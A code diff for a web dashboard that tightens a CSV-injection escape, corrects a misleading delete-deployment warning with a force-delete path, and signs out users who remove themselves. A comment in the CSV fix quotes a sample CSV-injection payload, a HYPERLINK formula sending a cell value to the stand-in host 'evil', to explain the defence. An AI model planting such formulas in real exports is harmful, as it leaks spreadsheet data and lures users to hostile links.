@@ -1753,7 +1753,18 @@
   // can't become an executing cell in Excel (CSV injection).
   function csvField(v) {
     var s = String(v == null ? "" : v);
-    if (/^[=+\-@\t]/.test(s)) s = "'" + s;
+    // R126 F3: parity with the server-side escape at
+    // server/src/routes/read.ts:560 (R77 F1). Prior shape was
+    // one char short — missing \r. R77 F1's threat description
+    // names CR explicitly: "Excel / Google Sheets / Numbers
+    // interpret any cell whose first char is =, +, -, @, TAB
+    // or CR as a formula." A leaked-AV_INGEST_TOKEN attacker
+    // (R119 F2 / R124 F3 / R125 F3 threat model) that sets
+    // sessionExternalId = "\r=HYPERLINK(\"http://evil/\"&A2,\"Sign here\")"
+    // lands a CR-leading formula into an owner's Excel-opened
+    // session export. Double-quote wrapping doesn't neutralize
+    // it — only the ' prefix suppresses formula parsing.
+    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
     return '"' + s.replace(/"/g, '""') + '"';
   }
   function exportSessionsCsv(sessions) {
@@ -2652,14 +2663,47 @@
     });
     var delBtn = $("#depDelete");
     if (delBtn) delBtn.addEventListener("click", function () {
+      // R126 F1: prior copy claimed "Sessions remain, the daemon
+      // can no longer connect." — false. The server's R94 F4 tx
+      // cascade-deletes every Session, Event, and Receipt for
+      // the deployment (schema.prisma Cascade FKs on
+      // Session.deploymentId, Event.sessionId, Receipt.sessionId)
+      // AND destroys deployment.publicKeyHex, breaking offline
+      // verification of any previously exported bundle. Also
+      // the .then had no .catch, so the 409
+      // deployment_has_sealed_receipts refusal was swallowed
+      // silently — Delete on a sealed-receipt deployment looked
+      // like a no-op with no explanation.
       confirmModal({
         title: "Delete deployment?",
-        body: "Sessions remain, the daemon can no longer connect.",
+        body: "This deletes the deployment AND every session, event, and signed receipt it produced. The verify anchor (publicKeyHex) is destroyed too — previously exported receipt bundles will no longer verify. This cannot be undone.",
         confirmLabel: "Delete", danger: true,
         onConfirm: function () {
           state.ds.deleteDeployment(d.id).then(function () {
-            toast("Deployment removed");
+            toast("Deployment and all sessions/receipts removed");
             navigate("#/deployments");
+          }).catch(function (err) {
+            // R94 F4 sealed-receipt guard: server returns 409
+            // { error: "deployment_has_sealed_receipts",
+            //   receiptCount, hint }. Surface the count and
+            // let the user opt into ?force=1.
+            var body = (err && err.data) || {};
+            if (body.error === "deployment_has_sealed_receipts") {
+              var n = body.receiptCount || 0;
+              confirmModal({
+                title: "Force delete " + n + " signed receipt" + (n === 1 ? "" : "s") + "?",
+                body: "This deployment has " + n + " signed receipt" + (n === 1 ? "" : "s") + " on record. Force-deleting destroys them permanently and revokes the deployment's public verify key — any auditor holding a previously exported bundle will see it fail signature verification.",
+                confirmLabel: "Force delete", danger: true,
+                onConfirm: function () {
+                  state.ds.deleteDeployment(d.id, { force: true }).then(function () {
+                    toast("Deployment force-deleted");
+                    navigate("#/deployments");
+                  }).catch(function (err2) { toast(err2.message || "Force delete failed", true); });
+                },
+              });
+            } else {
+              toast(err.message || "Delete failed", true);
+            }
           });
         },
       });
@@ -3378,14 +3422,42 @@
       if (!btn) return;
       var tr = e.target.closest("tr[data-user]");
       var uid = tr.getAttribute("data-user");
+      // R126 F2: branch on self-remove. R103 F1's server-side
+      // tx also revokes every ApiKey the removed user created
+      // AND drops the membership → next request 401s. Prior
+      // shape always called renderSettingsMembers(root) after
+      // success, so a self-remove:
+      //   1. Toast "Member removed"
+      //   2. listMembers() 401 → av-session-expired handler
+      //      fires SECOND toast "Your session expired…"
+      //   3. Bounce to /#/login without cross-tab sync (no
+      //      av_signed_out_at write)
+      // Same stacked-toast + no-warning + no-cross-tab-sync
+      // anti-pattern R125 F1 just fixed for the passkey-revoke
+      // sibling. Mirror that shape here.
+      var isSelf = uid === ((state.session && state.session.user && state.session.user.id) || null);
       confirmModal({
-        title: "Remove member?",
-        body: "They will lose access immediately. You can invite them again later.",
-        confirmLabel: "Remove", danger: true,
+        title: isSelf ? "Leave workspace?" : "Remove member?",
+        body: isSelf
+          ? "You'll be signed out and lose access to this workspace immediately. Every API key you created will be revoked. This cannot be undone from here — an owner or admin has to invite you back."
+          : "They will lose access immediately. Every API key they created will be revoked. You can invite them again later.",
+        confirmLabel: isSelf ? "Leave" : "Remove",
+        danger: true,
         onConfirm: function () {
           state.ds.removeMember(uid).then(function () {
-            toast("Member removed");
-            renderSettingsMembers(root);
+            if (isSelf) {
+              // Purposeful signout matching R125 F1 (passkey
+              // revoke) — sibling break-glass flow.
+              stopLiveStream();
+              rolePreview = null;
+              state.session = null;
+              try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e) {}
+              toast("You left the workspace. Sign in again to continue.");
+              navigate("#/login");
+            } else {
+              toast("Member removed");
+              renderSettingsMembers(root);
+            }
           }).catch(function (err) { toast(err.message || "Remove failed", true); });
         },
       });
